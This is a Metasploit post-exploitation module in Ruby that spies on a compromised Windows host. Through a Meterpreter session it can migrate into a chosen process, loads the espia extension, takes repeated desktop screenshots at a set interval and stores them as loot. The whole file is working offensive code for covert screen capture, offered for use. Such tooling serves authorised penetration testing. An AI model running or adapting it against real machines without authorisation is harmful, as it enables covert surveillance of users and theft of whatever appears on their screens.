##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'rbconfig'

class MetasploitModule < Msf::Post
  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Windows Gather Screen Spy',
        'Description' => %q{
          This module will incrementally take desktop screenshots from the host. This
          allows for screen spying which can be useful to determine if there is an active
          user on a machine, or to record the screen for later data extraction.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'Roni Bachar <roni.bachar.blog[at]gmail.com>', # original meterpreter script
          'bannedit', # post module
          'kernelsmith <kernelsmith /x40 kernelsmith /x2E com>', # record/loot support, log x approach, nx
          'Adrian Kubok', # better record file names
          'DLL_Cool_J' # Specify PID to migrate into
        ],
        'Platform' => ['win'], # @todo add support for posix meterpreter somehow?
        'SessionTypes' => ['meterpreter'],
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [],
          'SideEffects' => []
        },
        'Compat' => {
          'Meterpreter' => {
            'Commands' => %w[
              core_migrate
            ]
          }
        }
      )
    )

    register_options([
      OptInt.new('DELAY', [true, 'Interval between screenshots in seconds', 5]),
      OptInt.new('COUNT', [true, 'Number of screenshots to collect', 6]),
      OptBool.new('VIEW_SCREENSHOTS', [false, 'View screenshots automatically', false]),
      OptBool.new('RECORD', [true, 'Record all screenshots to disk by saving them to loot', true]),
      OptString.new('PID', [false, 'PID to migrate into before taking the screenshots', ''])
    ])
  end

  def view_screenshots?
    datastore['VIEW_SCREENSHOTS']
  end

  def record?
    datastore['RECORD']
  end

  def run
    fail_with(Failure::BadConfig, "Unsupported platform #{session.platform}") unless session.platform == 'windows'

    migrate(datastore['PID'].to_i) unless datastore['PID'].blank?

    begin
      session.core.use('espia')
    rescue StandardError => e
      fail_with(Failure::Unknown, "Failed to load espia extension (#{e})")
    end

    count = datastore['COUNT']
    print_status("Capturing #{count} screenshots with a delay of #{datastore['DELAY']} seconds")

    begin
      # calculate a sane number of leading zeros to use.  log of x  is ~ the number of digits
      leading_zeros = Math.log10(count).round
      file_locations = []
      count.times do |num|
        select(nil, nil, nil, datastore['DELAY'])

        begin
          data = session.espia.espia_image_get_dev_screen
        rescue Rex::Post::Meterpreter::RequestError => e
          fail_with(Failure::Unknown, "Error taking the screenshot: #{e.class} #{e} #{e.backtrace}")
        end

        unless data
          print_error('No screenshot data')
          next
        end

        if record?
          # let's loot it using non-clobbering filename, even though this is the source filename, not dest
          fn = "screenshot.%0#{leading_zeros}d.jpg" % num
          file_locations << store_loot('screenspy.screenshot', 'image/jpg', session, data, fn, 'Screenshot')
        end

        # also write to disk temporarily so we can display in browser.
        # They may or may not have been RECORDed.
        # do this if they have not suppressed VIEW_SCREENSHOT display
        next unless view_screenshots?

        screenshot = Rex::Quickfile.new("#{session.session_host}-screenshot.jpg")
        screenshot.write(data)
        screenshot.close
        Rex::Compat.open_browser("file://#{screenshot.path}")
      end
    rescue IOError, Errno::ENOENT => e
      fail_with(Failure::Unknown, "Error storing screenshot: #{e.class} #{e} #{e.backtrace}")
    end

    print_status('Screen Spying Complete')
    if record? && framework.db.active && !file_locations.empty?
      print_status('run loot -t screenspy.screenshot to see file locations of your newly acquired loot')
    end

    if view_screenshots?
      # wait 2 secs so the last file can get opened before deletion
      sleep(2)
      vprint_status("Deleting temporary screenshot file: #{screenshot.path}")
      begin
        ::File.delete(screenshot.path)
      rescue StandardError => e
        print_error("Error deleting the temporary screenshot file: #{e.class} #{e} #{e.backtrace}")
        print_error('This may be due to the file being in use if you are on a Windows platform')
      end
    end
  end

  def migrate(pid)
    session.core.migrate(pid)
    print_good("Migration to #{pid} successful")
    pid
  rescue StandardError
    fail_with(Failure::Unknown, 'Migration failed! Unable to take a screenshot under the desired process!')
  end
end
